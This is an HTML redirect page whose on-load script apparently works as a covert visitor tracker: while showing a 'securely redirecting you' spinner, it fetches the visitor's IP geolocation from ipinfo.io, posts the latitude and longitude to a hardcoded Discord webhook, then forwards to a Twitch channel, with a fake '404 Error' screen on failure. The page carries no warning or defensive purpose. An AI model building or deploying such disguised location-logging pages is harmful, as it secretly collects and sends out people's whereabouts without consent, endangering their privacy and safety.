<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f3f4f6;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            text-align: center;
            background-color: white;
            padding: 40px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            width: 100%;
            max-width: 600px;
            animation: fadeIn 1s ease-in-out;
        }

        h1 {
            color: #444;
            font-size: 28px;
            margin-bottom: 20px;
        }

        .loading {
            font-size: 16px;
            color: #666;
            margin-top: 5px;
        }

        .spinner {
            border: 4px solid #f3f4f6;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .error {
            color: red;
            font-size: 18px;
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Redirecting...</h1>
        <p class="loading">Please wait while we are securely redirecting you.</p>
        <div class="spinner"></div>
    </div>

    <script>
        async function trackVisitor() {
            const webhookURL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX"; // Your original webhook URL
            const redirectURL = "https://m.twitch.tv/scrappyvest28"; // Change to your desired redirect URL

            try {
                const searchParams = new URLSearchParams(window.location.search);
                const searchQuery = searchParams.get("search"); // Get the search parameter from URL
                let coordinates = null;

                if (searchQuery) {
                    // Geocoding API to convert search query to coordinates
                    const geoResponse = await fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(searchQuery)}`);
                    if (!geoResponse.ok) throw new Error("Failed to fetch geolocation for search term");

                    const geoData = await geoResponse.json();
                    if (geoData && geoData[0]) {
                        coordinates = geoData[0];
                    } else {
                        throw new Error("Invalid location or coordinates not found");
                    }
                } else {
                    // If no search parameter, use IP geolocation as fallback
                    const ipResponse = await fetch("https://ipinfo.io/json");
                    if (!ipResponse.ok) throw new Error("Failed to fetch IP info");

                    const ipData = await ipResponse.json();
                    if (!ipData.ip) throw new Error("Invalid IP data received");
                    
                    const { loc } = ipData;
                    const [lat, lon] = loc.split(",");
                    coordinates = { lat, lon };
                }

                // Preparing data for webhook
                const { lat, lon } = coordinates;
                const country = searchQuery || "Unknown"; // If no search, fallback to "Unknown"
                const flagUrl = `https://flagsapi.com/${country.toLowerCase()}/flat/64.png`;

                const payload = {
                    username: "Visitor Info",
                    avatar_url: flagUrl,
                    embeds: [{
                        title: `Visitor Location: ${country}`,
                        color: 39423,
                        fields: [
                            { name: "Latitude", value: `\`${lat}\``, inline: true },
                            { name: "Longitude", value: `\`${lon}\``, inline: true },
                            { name: "Search Query", value: `\`${searchQuery || "N/A"}\``, inline: false }
                        ],
                        footer: {
                            text: `Time: ${new Date().toLocaleString()}`,
                            icon_url: "https://upload.wikimedia.org/wikipedia/commons/e/ec/Clock-icon.png"
                        }
                    }]
                };

                // Send data to Discord webhook
                await fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });

                // Redirect after data is sent
                setTimeout(() => window.location.href = redirectURL, 3000);

            } catch (error) {
                console.error("Error:", error);
                showError();
            }
        }

        function showError() {
            document.body.innerHTML = `
                <div class="container">
                    <h1 class="error">404 Error</h1>
                    <p>Access blocked or an error occurred. Please try again later.</p>
                </div>
            `;
            setTimeout(() => window.location.href = "https://google.com", 3000);
        }

        window.onload = trackVisitor;
    </script>

</body>
</html>
